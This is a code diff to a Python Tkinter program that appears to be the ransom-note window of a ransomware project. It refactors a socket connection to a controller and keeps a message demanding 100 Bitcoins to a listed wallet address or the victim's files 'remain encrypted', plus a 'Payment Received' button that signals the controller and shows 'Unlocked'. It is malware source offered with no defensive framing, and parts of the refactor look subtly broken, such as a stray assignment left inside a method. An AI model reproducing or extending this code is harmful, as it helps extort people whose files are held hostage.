@@ -2,31 +2,26 @@ import tkinter
 from tkinter.ttk import *
 from tkinter import Tk
 from PIL import ImageTk, Image
-import threading
+from threading import Thread
 import socket, select
 import tkinter.messagebox as box
 
-host = '127.0.0.1'
-port = 5789
 
-s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect((host,port))
-
-def dialog1():
-        s.send(bytes('payment_received','utf8'))
-        box.showinfo('info','Unlocked')
-
-
-class App(threading.Thread):
-    def __init__(self):
-        threading.Thread.__init__(self)
+class App(Thread):
+    def __init__(self, conn):
+        Thread.__init__(self)
         self.start()
+        self.conn = conn
 
     def callback(self):
         self.root.quit()
 
-    payment = ""
-    def pop_up_win(self):
+    def dialog1(self):
+        self.conn.send(bytes('payment_received','utf8'))
+        box.showinfo('info','Unlocked')
+
+        payment = ""
+    def run(self):
 
         self.root = Tk()
         self.root.protocol("WM_DELETE_WINDOW", self.callback)
@@ -48,7 +43,7 @@ class App(threading.Thread):
         message += "Send 100 Bitcoins to the wallet address mentioned below or your files remain encrypted;)\n"
         message += "                             Wallet Address: 3FxAwHJ6AvmnU8NAoY8qFVEteddRbdkjhx"
 
-        btn = Button(frame, text = 'Payment Received',command = dialog1)
+        btn = Button(frame, text = 'Payment Received',command = self.dialog1)
         btn.pack(side = RIGHT , padx =5)
         l = Label(self.root, text = message)
         l.config(font =("Courier", 14))
